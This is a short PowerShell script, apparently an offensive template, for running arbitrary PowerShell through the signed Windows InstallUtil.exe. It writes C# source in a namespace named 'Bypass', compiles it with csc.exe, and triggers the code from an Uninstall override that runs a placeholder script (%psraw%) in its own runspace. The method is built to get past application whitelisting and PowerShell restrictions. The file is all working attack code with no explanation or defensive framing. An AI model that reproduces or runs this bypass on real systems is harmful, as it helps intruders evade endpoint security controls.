$csf = New-TemporaryFile;
$dllf = New-TemporaryFile;
Set-Content -Path $csf -Value @'
using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(1+2);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(@"%psraw%");
                foreach (PSObject result in ps.Invoke()) {
                    Console.WriteLine("{0}", result);
                }
                rs.Close();
            }
        }
    }
}
'@
$liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$dllf $csf;
c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=true /U $dllf;
